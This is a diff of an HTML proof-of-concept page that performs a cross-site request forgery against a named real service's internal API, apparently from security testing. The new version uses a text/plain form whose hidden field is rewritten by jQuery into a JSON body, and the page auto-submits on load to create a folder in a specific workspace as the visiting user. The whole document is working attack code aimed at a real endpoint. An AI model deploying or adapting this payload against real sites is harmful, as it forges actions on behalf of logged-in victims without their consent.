@@ -1,14 +1,19 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script>
+      $(document).ready(
+        function() {
+          $("#z").attr("name",'{"name":"test-csrf","icon":null,"iconColor":null,"description":"csrf-attack","fakeparam":"');
+          $("#f").submit();
+      });
+    </script>
+  </head>
 <body>
-  <form action="https://docs.superhuman.com/internalAppApi/workspaces/ws-96RE0OTDqM/folders" method="POST">
-  <input type="hidden" name='"name":"test-csrf"' value="">
-  <input type="hidden" name='"icon":null' value="">
-  <input type="hidden" name='"iconColor":null' value="">
-  <input type="hidden" name='"description":"csrf-attack"' value="">
-</form>
-<script>
-  document.forms[0].submit();
-</script>  
+  <form id="f" ENCTYPE="text/plain" action="https://docs.superhuman.com/internalAppApi/workspaces/ws-96RE0OTDqM/folders" method="post">
+    <input id="z" type="hidden" name='test' value='test"}'> 
+    <input type="submit" value="send">
+  </form>
 </body>
 </html>
